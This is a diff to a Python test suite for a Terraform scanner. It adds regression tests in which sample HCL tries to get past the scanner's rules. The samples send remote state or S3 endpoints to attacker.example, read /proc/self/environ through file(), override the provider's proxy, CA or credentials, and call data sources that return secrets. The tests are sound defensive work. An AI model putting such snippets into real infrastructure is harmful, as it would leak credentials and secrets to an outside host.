@@ -17,6 +17,9 @@ VERSIONS = '''terraform {
     region = "ap-northeast-2"
   }
 }
+provider "aws" {
+  region = "ap-northeast-2"
+}
 '''
 MAIN = '''data "aws_caller_identity" "current" {}
 
@@ -162,6 +165,116 @@ class ScanTests(unittest.TestCase):
         self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf",
                                                   'terraform {\n  backend "local" {}\n}\n')),
                          "backend 'local' outside versions.tf or not s3")
+
+
+    # --- bypass regressions (review finding 1-3): each must FAIL the scan ---
+
+    def assertFailsAll(self, rc_text, needles):
+        rc, text = rc_text
+        self.assertEqual(rc, 2, text)
+        self.assertIn("Scan: FAIL", text)
+        for needle in needles:
+            self.assertIn(needle, text)
+
+    def test_bypass_remote_state_http_backend_rejected(self):
+        # Remote state read through an http backend, with file() used to pull local data in.
+        hcl = ('data "terraform_remote_state" "x" {\n  backend = "http"\n  config = {\n'
+               '    address = "https://attacker.example/state"\n  }\n}\n'
+               'locals {\n  leak = file("/proc/self/environ")\n}\n')
+        self.assertFailsAll(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
+                            ["data source type 'terraform_remote_state' not allowed",
+                             "file-family function 'file' not allowed"])
+
+    def test_terraform_remote_state_rejected_even_with_s3_backend(self):
+        hcl = 'data "terraform_remote_state" "x" {\n  backend = "s3"\n}\n'
+        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
+                         "data source type 'terraform_remote_state' not allowed")
+
+    def test_file_family_functions_rejected(self):
+        for fn in ["file", "fileexists", "fileset", "filebase64", "filemd5", "templatefile", "pathexpand"]:
+            with self.subTest(fn=fn):
+                hcl = f'locals {{\n  x = {fn}("/proc/self/environ")\n}}\n'
+                self.assertFails(scan(lambda c, h=hcl: cand_file(c, ROOT + "/extra.tf", h)),
+                                 f"file-family function {fn!r} not allowed")
+
+    def test_file_function_with_space_before_paren_rejected(self):
+        hcl = 'locals {\n  x = file ("/etc/hostname")\n}\n'
+        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)), "file-family function")
+
+    def test_provider_endpoints_override_rejected(self):
+        hcl = ('provider "aws" {\n  region = "ap-northeast-2"\n  endpoints {\n'
+               '    s3 = "https://attacker.example"\n  }\n}\n')
+        self.assertFailsAll(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
+                            ["provider 'aws' block differs from main",
+                             "provider 'aws' sets denied argument 'endpoints'"])
+
+    def test_provider_proxy_and_ca_override_rejected(self):
+        for arg in ["http_proxy", "custom_ca_bundle", "insecure", "shared_credentials_files",
+                    "assume_role"]:
+            with self.subTest(arg=arg):
+                hcl = f'provider "aws" {{\n  region = "ap-northeast-2"\n  {arg} = "x"\n}}\n'
+                self.assertFails(scan(lambda c, h=hcl: cand_file(c, ROOT + "/versions.tf",
+                                                                 VERSIONS.replace(
+                                                                     'provider "aws" {\n  region = "ap-northeast-2"\n}\n',
+                                                                     h))),
+                                 f"denied argument {arg!r}")
+
+    def test_provider_alias_block_differs_from_main_rejected(self):
+        hcl = 'provider "aws" {\n  alias  = "other"\n  region = "us-east-1"\n}\n'
+        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
+                         "provider 'aws' block differs from main")
+
+    def test_unquoted_module_git_source_rejected(self):
+        hcl = 'module x {\n  source = "git::https://example.com/mod.git"\n}\n'
+        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
+                         "non-local module source not allowed")
+
+    def test_unquoted_module_bare_source_rejected(self):
+        hcl = 'module x {\n  source = git::https://example.com/mod.git\n}\n'
+        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
+                         "module source must be exactly one literal string")
+
+    def test_module_source_from_variable_rejected(self):
+        hcl = 'module "x" {\n  source = var.src\n}\n'
+        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
+                         "module source must be exactly one literal string")
+
+    def test_unquoted_local_module_passes(self):
+        bad_free = MAIN.replace('module "x"', 'module x')
+        rc, text = scan(lambda c: cand_file(c, ROOT + "/main.tf", bad_free))
+        self.assertEqual(rc, 0, text)
+
+    def test_lambda_invocation_data_source_rejected(self):
+        hcl = ('data "aws_lambda_invocation" "x" {\n  function_name = "f"\n'
+               '  input = "{}"\n}\n')
+        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)),
+                         "data source type 'aws_lambda_invocation' not allowed")
+
+    def test_kms_secrets_and_ecr_token_data_sources_rejected(self):
+        for dtype in ["aws_kms_secrets", "aws_ecr_authorization_token"]:
+            with self.subTest(dtype=dtype):
+                hcl = f'data "{dtype}" "x" {{}}\n'
+                self.assertFails(scan(lambda c, h=hcl: cand_file(c, ROOT + "/extra.tf", h)),
+                                 f"data source type {dtype!r} not allowed")
+
+    def test_unquoted_resource_local_exec_provisioner_rejected(self):
+        hcl = ('resource aws_s3_bucket b {\n  bucket = "x"\n'
+               '  provisioner local-exec {\n    command = "true"\n  }\n}\n')
+        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", hcl)), "provisioner not allowed")
+
+    def test_unquoted_null_resource_rejected(self):
+        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", "resource null_resource x {}\n")),
+                         "resource type 'null_resource' not allowed")
+
+    def test_prose_in_strings_is_not_a_block(self):
+        prose = ('variable "x" {\n  description = "provider rejects any other account; module names and '
+                 'data source notes are fine"\n  type = string\n}\n')
+        rc, text = scan(lambda c: cand_file(c, ROOT + "/extra.tf", prose))
+        self.assertEqual(rc, 0, text)
+
+    def test_unquoted_provider_other_than_aws_rejected(self):
+        self.assertFails(scan(lambda c: cand_file(c, ROOT + "/extra.tf", "provider http {}\n")),
+                         "provider 'http' not allowed")
 
 
 if __name__ == "__main__":
